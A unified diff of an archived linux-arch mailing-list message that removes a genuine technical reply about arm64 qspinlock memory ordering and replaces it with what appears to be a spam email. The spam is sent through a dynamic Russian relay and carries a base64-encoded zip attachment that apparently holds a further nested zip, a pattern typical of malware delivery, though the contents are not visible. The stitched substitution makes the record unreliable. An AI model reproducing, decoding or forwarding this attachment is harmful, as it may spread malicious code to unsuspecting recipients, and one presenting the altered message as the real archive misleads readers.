@@ -1,93 +1,73 @@
-From: Will Deacon <will.deacon@arm.com>
-Subject: Re: [PATCH 3/3] arm64/locking: qspinlocks and qrwlocks support
-Date: Fri, 28 Apr 2017 16:44:16 +0100
-Message-ID: <20170428154416.GW13675@arm.com>
-References: <1491860104-4103-1-git-send-email-ynorov@caviumnetworks.com>
- <1491860104-4103-4-git-send-email-ynorov@caviumnetworks.com>
- <20170413181212.y3ezah76qoztxhnn@hirez.programming.kicks-ass.net>
- <20170420182318.4ddtfiobxz6hgbo4@yury-N73SV>
- <20170420190530.GA6873@worktop>
- <20170426123947.ogap6xgg7xc5wsd4@yury-N73SV>
+From: <tchidrenplytoo@aim.com>
+Subject: 51327 linux-arch
+Date: Fri, 28 Apr 2017 19:56:12 -0000
+Message-ID: <149340937279.16505.10612083268302492548@saturn-internet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="96920594.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from foss.arm.com ([217.140.101.70]:50668 "EHLO foss.arm.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1424317AbdD1PoQ (ORCPT <rfc822;linux-arch@vger.kernel.org>);
-        Fri, 28 Apr 2017 11:44:16 -0400
-Content-Disposition: inline
-In-Reply-To: <20170426123947.ogap6xgg7xc5wsd4@yury-N73SV>
+Received: from 178.161.230.122.dyn.v4.saturn-internet.ru ([178.161.230.122]:43109
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1422824AbdD1T4R (ORCPT
+        <rfc822;linux-arch@vger.kernel.org>);
+        Fri, 28 Apr 2017 15:56:17 -0400
+Content-Disposition: attachment
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: Yury Norov <ynorov@caviumnetworks.com>
-Cc: Peter Zijlstra <peterz@infradead.org>, linux-kernel@vger.kernel.org, linux-arch@vger.kernel.org, linux-arm-kernel@lists.infradead.org, Ingo Molnar <mingo@redhat.com>, Arnd Bergmann <arnd@arndb.de>, Catalin Marinas <catalin.marinas@arm.com>, Jan Glauber <jglauber@cavium.com>
+To: linux-arch@vger.kernel.org
 
-On Wed, Apr 26, 2017 at 03:39:47PM +0300, Yury Norov wrote:
-> On Thu, Apr 20, 2017 at 09:05:30PM +0200, Peter Zijlstra wrote:
-> > On Thu, Apr 20, 2017 at 09:23:18PM +0300, Yury Norov wrote:
-> > > Is there some test to reproduce the locking failure for the case.
-> > 
-> > Possibly sysvsem stress before commit:
-> > 
-> >   27d7be1801a4 ("ipc/sem.c: avoid using spin_unlock_wait()")
-> > 
-> > Although a similar scheme is also used in nf_conntrack, see commit:
-> > 
-> >   b316ff783d17 ("locking/spinlock, netfilter: Fix nf_conntrack_lock() barriers")
-> > 
-> > > I
-> > > ask because I run loctorture for many hours on my qemu (emulating
-> > > cortex-a57), and I see no failures in the test reports. And Jan did it
-> > > on ThunderX, and Adam on QDF2400 without any problems. So even if I
-> > > rework those functions, how could I check them for correctness?
-> > 
-> > Running them doesn't prove them correct. Memory ordering bugs have been
-> > in the kernel for many years without 'ever' triggering. This is stuff
-> > you have to think about.
-> > 
-> > > Anyway, regarding the queued_spin_unlock_wait(), is my understanding
-> > > correct that you assume adding smp_mb() before entering the for(;;)
-> > > cycle, and using ldaxr/strxr instead of atomic_read()?
-> > 
-> > You'll have to ask Will, I always forget the arm64 details.
-> 
-> So, below is what I have. For queued_spin_unlock_wait() the generated
-> code is looking like this:
-> ffff0000080983a0 <queued_spin_unlock_wait>:
-> ffff0000080983a0:       d5033bbf        dmb     ish
-> ffff0000080983a4:       b9400007        ldr     w7, [x0]
-> ffff0000080983a8:       350000c7        cbnz    w7, ffff0000080983c0 <queued_spin_unlock_wait+0x20>
-> ffff0000080983ac:       1400000e        b       ffff0000080983e4 <queued_spin_unlock_wait+0x44>
-> ffff0000080983b0:       d503203f        yield
-> ffff0000080983b4:       d5033bbf        dmb     ish
-> ffff0000080983b8:       b9400007        ldr     w7, [x0]
-> ffff0000080983bc:       34000147        cbz     w7, ffff0000080983e4 <queued_spin_unlock_wait+0x44>
-> ffff0000080983c0:       f2401cff        tst     x7, #0xff
-> ffff0000080983c4:       54ffff60        b.eq    ffff0000080983b0 <queued_spin_unlock_wait+0x10>
-> ffff0000080983c8:       14000003        b       ffff0000080983d4 <queued_spin_unlock_wait+0x34>
-> ffff0000080983cc:       d503201f        nop
-> ffff0000080983d0:       d503203f        yield
-> ffff0000080983d4:       d5033bbf        dmb     ish
-> ffff0000080983d8:       b9400007        ldr     w7, [x0]
-> ffff0000080983dc:       f2401cff        tst     x7, #0xff
-> ffff0000080983e0:       54ffff81        b.ne    ffff0000080983d0 <queued_spin_unlock_wait+0x30>
-> ffff0000080983e4:       d50339bf        dmb     ishld
-> ffff0000080983e8:       d65f03c0        ret
-> ffff0000080983ec:       d503201f        nop
-> 
-> If I understand the documentation correctly, it's enough to check the lock
-> properly. If not - please give me the clue. Will?
-
-Sorry, but I haven't had time to page this back in recently, so I can't give
-you an answer straight off the bat. I'll need to go back and revisit the
-qspinlock parts and, in particular, use of WFE before I'm comfortable with
-this. I also don't want this on by default for the arm64 kernel, and I'd
-like to see numbers comparing with our ticket locks on silicon with and
-without the large system extensions, for low (<=8), medium (8-32) and high
-(>32) core counts.
-
-I'm very nervous about switching our locking implementation over to
-something that's largely been developed and tested for x86, which has a
-stronger memory model.
-
-Will
+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
+AQBbAAAAoQsAAAAA
